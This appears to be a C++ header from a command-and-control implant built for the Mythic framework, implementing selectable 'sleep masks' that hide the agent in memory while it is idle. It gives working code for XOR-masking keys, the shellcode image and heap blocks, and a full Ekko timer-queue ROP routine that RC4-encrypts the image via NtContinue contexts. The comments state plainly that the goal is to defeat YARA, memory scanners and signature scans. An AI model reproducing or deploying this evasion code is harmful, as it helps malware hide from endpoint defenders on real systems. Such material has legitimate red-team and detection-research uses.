#ifndef STARBURST_EVASION_SLEEP_MASKS_H
#define STARBURST_EVASION_SLEEP_MASKS_H

/*
 * Sleep masks - operator-customizable data masking during sleep.
 *
 * This file provides compile-time selectable masking implementations
 * for evasion_pre_sleep() and evasion_post_sleep(). The pattern follows
 * spoof_profiles.h: preprocessor selection via SLEEP_MASK_TYPE.
 *
 * WORKFLOW - Swapping masks:
 *
 *   1. Select a mask type in the Mythic build dialog, or set
 *      #define SLEEP_MASK_TYPE MASK_* in config.h for manual builds.
 *
 *   2. For MASK_CUSTOM, edit the custom section below with your own
 *      masking logic. Must implement mask_pre_sleep() and mask_post_sleep().
 *
 * AVAILABLE MASKS:
 *
 *   MASK_DEFAULT     - XOR sensitive fields only (AES key + UUIDs, ~104 bytes)
 *   MASK_FULL_IMAGE  - XOR entire shellcode image (VirtualProtect RW↔RX flip)
 *   MASK_HEAP        - XOR sensitive fields + all heap allocations
 *   MASK_EKKO        - Timer-queue ROP: RC4-encrypts entire image during sleep (x64)
 *   MASK_CUSTOM      - Operator-defined masking logic
 *
 * NOTE: MASK_EKKO replaces the entire sleep cycle (pre + sleep + post) via
 * evasion_ekko_sleep(). It uses CreateTimerQueueTimer + NtContinue ROP to
 * encrypt the image, sleep, and decrypt - all from ntdll timer-thread context.
 * On x86 builds, MASK_EKKO falls back to MASK_DEFAULT behavior.
 */

#include <constexpr.h>
#include <stdint.h>
#include <evasion/sleep_mask_types.h>

#ifndef SLEEP_MASK_TYPE
#define SLEEP_MASK_TYPE MASK_DEFAULT
#endif


#if SLEEP_MASK_TYPE == MASK_DEFAULT

/* ── Default: XOR sensitive fields only ──
 * Masks AES-256 session key (32 bytes) and both UUIDs (36 bytes each).
 * Lightweight - only ~104 bytes touched. Agent code and heap remain plaintext.
 */
static auto declfn mask_pre_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    xor_sensitive_data( inst );
}

static auto declfn mask_post_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    xor_sensitive_data( inst );
}


#elif SLEEP_MASK_TYPE == MASK_FULL_IMAGE

/* ── Full image: XOR entire shellcode region ──
 * Masks all code and embedded data in the shellcode image.
 * Defeats YARA rules, signature scans, and string matching during sleep.
 * Requires VirtualProtect RX→RWX→RX flip - generates ETW telemetry.
 *
 * ARCHITECTURE: Like Ekko, this mask owns the entire sleep cycle. The
 * pre/post split doesn't work here because mask_pre_sleep returns into
 * evasion_pre_sleep / sleep_with_jitter - code that was just XOR'd.
 * Instead, fi_sleep() does: XOR → NtDelayExecution → un-XOR → return.
 * All mask functions remain in the skip region and never get encrypted.
 */

static auto declfn fi_sleep( instance& inst, uint32_t sleep_ms ) -> void;

static auto declfn xor_image(
    instance& inst, uintptr_t skip_base, uint32_t skip_size
) -> void {
    auto base = reinterpret_cast<uint8_t*>( inst.evasion.ekko.img_base );
    auto size = inst.evasion.ekko.img_size;
    auto key  = inst.evasion.ekko.rc4_key;

    for ( uint32_t i = 0; i < size; i++ ) {
        uintptr_t addr = reinterpret_cast<uintptr_t>( base + i );
        if ( skip_base && addr >= skip_base && addr < skip_base + skip_size )
            continue;
        base[i] ^= key[ i % 16 ];
    }
}

static auto declfn flip_protection(
    instance& inst, DWORD new_protect
) -> DWORD {
    typedef BOOL (WINAPI *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);

    auto pVirtualProtect = reinterpret_cast<fn_VirtualProtect>(
        resolve::_api( inst.kernel32.handle,
            expr::hash_string( "VirtualProtect" ) ) );
    if ( !pVirtualProtect ) return 0;

    DWORD old_protect = 0;
    pVirtualProtect(
        reinterpret_cast<LPVOID>( inst.evasion.ekko.img_base ),
        inst.evasion.ekko.img_size,
        new_protect,
        &old_protect
    );
    return old_protect;
}

static auto declfn fi_skip_region(
    uintptr_t& out_base, uint32_t& out_size
) -> void {
    uintptr_t addrs[] = {
        reinterpret_cast<uintptr_t>( &xor_image ),
        reinterpret_cast<uintptr_t>( &flip_protection ),
        reinterpret_cast<uintptr_t>( &fi_skip_region ),
        reinterpret_cast<uintptr_t>( &fi_sleep ),
        reinterpret_cast<uintptr_t>( &xor_sensitive_data ),
    };
    uintptr_t lo = addrs[0], hi = addrs[0];
    for ( int i = 1; i < 5; i++ ) {
        if ( addrs[i] < lo ) lo = addrs[i];
        if ( addrs[i] > hi ) hi = addrs[i];
    }
    out_base = lo;
    out_size = static_cast<uint32_t>( hi - lo ) + 0x400;
}

/* Owns entire sleep cycle: XOR image → sleep → un-XOR image.
 * Never returns while image is encrypted - caller code stays valid. */
static auto declfn fi_sleep( instance& inst, uint32_t sleep_ms ) -> void {
    if ( !inst.evasion.ekko.initialized ) {
        LARGE_INTEGER delay;
        delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
        inst.ntdll.NtDelayExecution( FALSE, &delay );
        return;
    }

    uintptr_t skip_base; uint32_t skip_size;
    fi_skip_region( skip_base, skip_size );

    /* mask - RWX keeps skip region executable while we XOR the rest */
    xor_sensitive_data( inst );
    flip_protection( inst, PAGE_EXECUTE_READWRITE );
    xor_image( inst, skip_base, skip_size );

    /* sleep - image is encrypted, these functions are in skip region */
    LARGE_INTEGER delay;
    delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
    inst.ntdll.NtDelayExecution( FALSE, &delay );

    /* unmask */
    xor_image( inst, skip_base, skip_size );
    flip_protection( inst, PAGE_EXECUTE_READ );
    xor_sensitive_data( inst );
}

/* Pre/post are no-ops - fi_sleep owns the full cycle. */
static auto declfn mask_pre_sleep( instance& inst ) -> void {
    (void)inst;
}

static auto declfn mask_post_sleep( instance& inst ) -> void {
    (void)inst;
}


#elif SLEEP_MASK_TYPE == MASK_HEAP

/* ── Heap: XOR sensitive fields + all heap allocations ──
 * Walks HeapWalk() over GetProcessHeap() and XOR-masks all BUSY blocks.
 * Catches dynamically allocated buffers (task data, downloaded files, etc.)
 * No VirtualProtect calls needed - heap is already RW.
 * Agent code (.text) remains plaintext.
 */

typedef BOOL (WINAPI *fn_HeapWalk)( HANDLE, LPPROCESS_HEAP_ENTRY );
typedef HANDLE (WINAPI *fn_GetProcessHeap)( void );

static auto declfn xor_heap_blocks( instance& inst ) -> void {
    auto pGetProcessHeap = reinterpret_cast<fn_GetProcessHeap>(
        resolve::_api( inst.kernel32.handle,
            expr::hash_string( "GetProcessHeap" ) ) );
    auto pHeapWalk = reinterpret_cast<fn_HeapWalk>(
        resolve::_api( inst.kernel32.handle,
            expr::hash_string( "HeapWalk" ) ) );

    if ( !pGetProcessHeap || !pHeapWalk ) return;

    HANDLE heap = pGetProcessHeap();
    if ( !heap ) return;

    auto key = inst.evasion.ekko.rc4_key;
    PROCESS_HEAP_ENTRY entry = {};
    while ( pHeapWalk( heap, &entry ) ) {
        if ( !( entry.wFlags & PROCESS_HEAP_ENTRY_BUSY ) ) continue;
        if ( entry.cbData < 16 ) continue;

        auto block_start = reinterpret_cast<uintptr_t>( entry.lpData );
        auto key_start   = reinterpret_cast<uintptr_t>( inst.evasion.ekko.rc4_key );
        if ( block_start <= key_start &&
             key_start < block_start + entry.cbData )
            continue;

        auto data = reinterpret_cast<uint8_t*>( entry.lpData );
        for ( uint32_t i = 0; i < entry.cbData; i++ ) {
            data[i] ^= key[ i % 16 ];
        }
    }
}

static auto declfn mask_pre_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    xor_sensitive_data( inst );
    xor_heap_blocks( inst );
}

static auto declfn mask_post_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    xor_heap_blocks( inst );
    xor_sensitive_data( inst );
}


#elif SLEEP_MASK_TYPE == MASK_CUSTOM

/* ── Custom mask ── OPERATOR: edit below ──
 *
 * Implement your own masking logic. Must provide mask_pre_sleep() and
 * mask_post_sleep() with matching signatures.
 *
 * Ideas:
 *   - Full image + heap combined
 *   - Selective section masking (mask .rdata but not .text)
 *   - Custom encryption (RC4/AES instead of XOR)
 *   - Stack masking for sensitive local variables
 *
 * xor_sensitive_data(inst) is available - call it for baseline field protection.
 */

static auto declfn mask_pre_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    /* OPERATOR: Add your pre-sleep masking here */
    xor_sensitive_data( inst );
}

static auto declfn mask_post_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    /* OPERATOR: Add your post-sleep masking here */
    xor_sensitive_data( inst );
}


#elif SLEEP_MASK_TYPE == MASK_EKKO

/* ── Ekko: Timer-queue ROP sleep obfuscation (x64 only) ──
 *
 * Uses CreateTimerQueueTimer to schedule ROP gadgets that:
 *   1. Flip image memory to RW
 *   2. RC4-encrypt the entire shellcode image via SystemFunction032
 *   3. Sleep via WaitForSingleObject (image is encrypted during this)
 *   4. RC4-decrypt the image (symmetric - same key)
 *   5. Restore RX permissions
 *   6. Signal completion event
 *
 * Because encrypt/decrypt/sleep happen in ntdll timer-thread context (outside
 * the agent image), the image is fully encrypted in memory for the entire
 * sleep duration. Defeats memory scanners, YARA, and signature matching.
 *
 * Each timer callback receives a single LPVOID. For functions needing multiple
 * arguments, we build a CONTEXT struct and call NtContinue - the timer callback
 * target is NtContinue, and the LPVOID is a pointer to a CONTEXT whose RIP/RCX/
 * RDX/R8/R9 encode the real function call.
 *
 * NOTE: x64 only. On x86 builds this falls back to MASK_DEFAULT behavior.
 */

#ifdef _WIN64

/* RC4 encrypt/decrypt via undocumented SystemFunction032 */
typedef struct _USTRING {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING, *PUSTRING;

typedef NTSTATUS (NTAPI *fnSystemFunction032)( PUSTRING data, PUSTRING key );
typedef HANDLE   (WINAPI *fnCreateTimerQueue)( void );
typedef BOOL     (WINAPI *fnCreateTimerQueueTimer)(
    PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG );
typedef BOOL     (WINAPI *fnDeleteTimerQueue)( HANDLE );
typedef HANDLE   (WINAPI *fnCreateEventW)( LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR );
typedef BOOL     (WINAPI *fnSetEvent)( HANDLE );
typedef VOID     (NTAPI  *fnNtContinue)( PCONTEXT, BOOLEAN );
typedef VOID     (NTAPI  *fnRtlCaptureContext)( PCONTEXT );

/* Helper: set up a CONTEXT to call func(a,b,c,d) via NtContinue.
 * The template context must have been captured via RtlCaptureContext first.
 *
 * When NtContinue executes this context, the timer-thread context is replaced:
 * RIP → func, RCX-R9 → args, RSP → aligned stack with return address.
 * The return address at [RSP] points to RtlExitUserThread(0) so the timer
 * callback thread exits cleanly after the gadget function returns. */
static auto declfn ekko_setup_context(
    PCONTEXT ctx_template,
    PCONTEXT ctx_out,
    uintptr_t func,
    uintptr_t arg1,
    uintptr_t arg2,
    uintptr_t arg3,
    uintptr_t arg4,
    uintptr_t ret_gadget
) -> void {
    /* Copy the captured context as a base */
    auto dst = reinterpret_cast<uint8_t*>( ctx_out );
    auto src = reinterpret_cast<const uint8_t*>( ctx_template );
    for ( uint32_t i = 0; i < sizeof(CONTEXT); i++ )
        dst[i] = src[i];

    ctx_out->Rip = func;
    ctx_out->Rcx = arg1;
    ctx_out->Rdx = arg2;
    ctx_out->R8  = arg3;
    ctx_out->R9  = arg4;

    /* Set up the stack: RSP aligned to 16-byte boundary (as if a call just
     * pushed a return address, so RSP is 16n+8 after push = 16n-8 before).
     * Drop RSP by a frame to avoid clobbering, then place return address. */
    ctx_out->Rsp &= ~0xFull;
    ctx_out->Rsp -= 8;
    *reinterpret_cast<uintptr_t*>( ctx_out->Rsp ) = ret_gadget;
}

static auto declfn ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {

    /* ── resolve all required APIs ── */

    auto pCreateTimerQueue = reinterpret_cast<fnCreateTimerQueue>(
        resolve::_api( inst.kernel32.handle,
            expr::hash_string( "CreateTimerQueue" ) ) );

    auto pCreateTimerQueueTimer = reinterpret_cast<fnCreateTimerQueueTimer>(
        resolve::_api( inst.kernel32.handle,
            expr::hash_string( "CreateTimerQueueTimer" ) ) );

    auto pDeleteTimerQueue = reinterpret_cast<fnDeleteTimerQueue>(
        resolve::_api( inst.kernel32.handle,
            expr::hash_string( "DeleteTimerQueue" ) ) );

    auto pCreateEventW = reinterpret_cast<fnCreateEventW>(
        resolve::_api( inst.kernel32.handle,
            expr::hash_string( "CreateEventW" ) ) );

    auto pSetEvent = reinterpret_cast<fnSetEvent>(
        resolve::_api( inst.kernel32.handle,
            expr::hash_string( "SetEvent" ) ) );

    auto pNtContinue = reinterpret_cast<fnNtContinue>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "NtContinue" ) ) );

    auto pRtlCaptureContext = reinterpret_cast<fnRtlCaptureContext>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "RtlCaptureContext" ) ) );

    /* SystemFunction032 lives in advapi32 (forwarded from cryptsp on modern Windows) */
    auto hAdvapi32 = inst.kernel32.LoadLibraryA( symbol<LPCSTR>( "advapi32.dll" ) );
    auto pSystemFunction032 = reinterpret_cast<fnSystemFunction032>(
        inst.kernel32.GetProcAddress( hAdvapi32,
            symbol<LPCSTR>( "SystemFunction032" ) ) );

    /* Find a `ret` (0xC3) gadget in ntdll .text for the NtContinue return address.
     * When the target function returns, it hits this `ret` which pops the next
     * value from RSP - effectively cleanly exiting the timer callback. */
    uintptr_t ret_gadget = 0;
    {
        auto ntdll_base = reinterpret_cast<uint8_t*>( inst.ntdll.handle );
        auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>( ntdll_base );
        auto nt  = reinterpret_cast<IMAGE_NT_HEADERS*>( ntdll_base + dos->e_lfanew );
        auto sec = IMAGE_FIRST_SECTION( nt );
        for ( uint16_t s = 0; s < nt->FileHeader.NumberOfSections; s++ ) {
            if ( !( sec[s].Characteristics & IMAGE_SCN_MEM_EXECUTE ) ) continue;
            auto sec_base = ntdll_base + sec[s].VirtualAddress;
            auto sec_size = sec[s].Misc.VirtualSize;
            for ( uint32_t j = 0; j < sec_size; j++ ) {
                if ( sec_base[j] == 0xC3 ) {
                    ret_gadget = reinterpret_cast<uintptr_t>( sec_base + j );
                    goto found_gadget;
                }
            }
        }
    found_gadget:;
    }

    /* Validate all pointers - fall back to simple masking on failure */
    if ( !pCreateTimerQueue || !pCreateTimerQueueTimer || !pDeleteTimerQueue ||
         !pCreateEventW || !pSetEvent || !pNtContinue || !pRtlCaptureContext ||
         !pSystemFunction032 || !ret_gadget ) {
        DBG_PRINT( inst, "ekko: API resolution failed, falling back to XOR mask\n" );
        xor_sensitive_data( inst );
        return;
    }

    /* ── create synchronization primitives ── */

    HANDLE hEvent = pCreateEventW( nullptr, FALSE, FALSE, nullptr );
    if ( !hEvent ) {
        xor_sensitive_data( inst );
        return;
    }

    HANDLE hTimerQueue = pCreateTimerQueue();
    if ( !hTimerQueue ) {
        inst.kernel32.CloseHandle( hEvent );
        xor_sensitive_data( inst );
        return;
    }

    /* ── build SystemFunction032 argument structs ── */

    USTRING img_data = {};
    img_data.Length        = inst.evasion.ekko.img_size;
    img_data.MaximumLength = inst.evasion.ekko.img_size;
    img_data.Buffer        = reinterpret_cast<PVOID>( inst.evasion.ekko.img_base );

    USTRING key_data = {};
    key_data.Length        = 16;
    key_data.MaximumLength = 16;
    key_data.Buffer        = inst.evasion.ekko.rc4_key;

    /* Scratch space for VirtualProtect's old-protect output parameter */
    DWORD old_protect = 0;

    /* ── capture current context as template for ROP ── */

    CONTEXT ctx_template;
    __builtin_memset( &ctx_template, 0, sizeof(ctx_template) );
    ctx_template.ContextFlags = CONTEXT_FULL;
    pRtlCaptureContext( &ctx_template );

    /* ── build per-timer CONTEXT structs ── */

    /* We need 6 contexts for 6 NtContinue calls:
     *   [0] VirtualProtect( img_base, img_size, PAGE_READWRITE, &old_protect )
     *   [1] SystemFunction032( &img_data, &key_data )      - encrypt
     *   [2] WaitForSingleObject( hEvent, sleep_ms )         - sleep
     *   [3] SystemFunction032( &img_data, &key_data )      - decrypt
     *   [4] VirtualProtect( img_base, img_size, old_protect, &old_protect )
     *       ^ We use PAGE_EXECUTE_READ here since we know the original prot
     *   [5] SetEvent( hEvent )                              - signal done
     */

    CONTEXT rop_ctx[6];

    /* Timer 0: VirtualProtect → RW */
    ekko_setup_context(
        &ctx_template, &rop_ctx[0],
        reinterpret_cast<uintptr_t>( inst.kernel32.VirtualProtect ),
        reinterpret_cast<uintptr_t>( inst.evasion.ekko.img_base ),
        static_cast<uintptr_t>( inst.evasion.ekko.img_size ),
        static_cast<uintptr_t>( PAGE_READWRITE ),
        reinterpret_cast<uintptr_t>( &old_protect ),
        ret_gadget
    );

    /* Timer 1: SystemFunction032 - encrypt */
    ekko_setup_context(
        &ctx_template, &rop_ctx[1],
        reinterpret_cast<uintptr_t>( pSystemFunction032 ),
        reinterpret_cast<uintptr_t>( &img_data ),
        reinterpret_cast<uintptr_t>( &key_data ),
        0, 0,
        ret_gadget
    );

    /* Timer 2: WaitForSingleObject - the actual sleep (image encrypted) */
    ekko_setup_context(
        &ctx_template, &rop_ctx[2],
        reinterpret_cast<uintptr_t>( inst.kernel32.WaitForSingleObject ),
        reinterpret_cast<uintptr_t>( hEvent ),
        static_cast<uintptr_t>( sleep_ms ),
        0, 0,
        ret_gadget
    );

    /* Timer 3: SystemFunction032 - decrypt (RC4 is symmetric) */
    ekko_setup_context(
        &ctx_template, &rop_ctx[3],
        reinterpret_cast<uintptr_t>( pSystemFunction032 ),
        reinterpret_cast<uintptr_t>( &img_data ),
        reinterpret_cast<uintptr_t>( &key_data ),
        0, 0,
        ret_gadget
    );

    /* Timer 4: VirtualProtect → restore RX */
    ekko_setup_context(
        &ctx_template, &rop_ctx[4],
        reinterpret_cast<uintptr_t>( inst.kernel32.VirtualProtect ),
        reinterpret_cast<uintptr_t>( inst.evasion.ekko.img_base ),
        static_cast<uintptr_t>( inst.evasion.ekko.img_size ),
        static_cast<uintptr_t>( PAGE_EXECUTE_READ ),
        reinterpret_cast<uintptr_t>( &old_protect ),
        ret_gadget
    );

    /* Timer 5: SetEvent - signal completion */
    ekko_setup_context(
        &ctx_template, &rop_ctx[5],
        reinterpret_cast<uintptr_t>( pSetEvent ),
        reinterpret_cast<uintptr_t>( hEvent ),
        0, 0, 0,
        ret_gadget
    );

    /* ── queue the timers ──
     * Each timer fires NtContinue with its CONTEXT* as the parameter.
     * DueTimes are staggered to ensure sequential execution.
     * WT_EXECUTEINTIMERTHREAD ensures single-threaded ordering. */

    HANDLE hTimers[6] = {};

    /* DueTimes staggered with 200ms spacing. Timer 0 starts at 200ms to give
     * the main thread time to finish queueing all timers and call
     * WaitForSingleObject before the first timer fires. */
    DWORD  due_times[6] = { 200, 400, 600, 800, 1000, 1200 };

    bool queued_ok = true;
    for ( int i = 0; i < 6; i++ ) {
        if ( !pCreateTimerQueueTimer(
                &hTimers[i],
                hTimerQueue,
                reinterpret_cast<WAITORTIMERCALLBACK>( pNtContinue ),
                &rop_ctx[i],
                due_times[i],
                0,                          /* Period = 0 -> fires once */
                WT_EXECUTEINTIMERTHREAD ) )  /* Execute in timer thread for ordering */
        {
            queued_ok = false;
            DBG_PRINT( inst, "ekko: failed to queue timer %d\n", i );
            break;
        }
    }

    if ( queued_ok ) {
        /* XOR sensitive fields before the timers start firing.
         * Timer 0 fires at 200ms, giving us time to mask data and enter the wait. */
        xor_sensitive_data( inst );

        /* Wait for the final SetEvent timer to signal completion.
         * Add generous timeout: sleep_ms + 10s for timer scheduling overhead.
         * If this times out, something went wrong - we still try to recover. */
        inst.kernel32.WaitForSingleObject( hEvent, sleep_ms + 10000 );

        /* Restore sensitive data - image is now decrypted and RX again */
        xor_sensitive_data( inst );
    } else {
        /* Timer queue setup failed - fall back to simple XOR masking */
        xor_sensitive_data( inst );
        LARGE_INTEGER delay;
        delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
        inst.ntdll.NtDelayExecution( FALSE, &delay );
        xor_sensitive_data( inst );
    }

    /* ── cleanup ── */
    pDeleteTimerQueue( hTimerQueue );
    inst.kernel32.CloseHandle( hEvent );
}

/* Ekko replaces the entire sleep cycle, so pre/post are no-ops.
 * The actual orchestration happens via ekko_sleep() called from main.cc. */
static auto declfn mask_pre_sleep( instance& inst ) -> void {
    (void)inst;
}

static auto declfn mask_post_sleep( instance& inst ) -> void {
    (void)inst;
}

#else /* x86 fallback - Ekko ROP requires x64 CONTEXT manipulation */

static auto declfn mask_pre_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    xor_sensitive_data( inst );
}

static auto declfn mask_post_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    xor_sensitive_data( inst );
}

#endif /* _WIN64 */

#endif

#endif
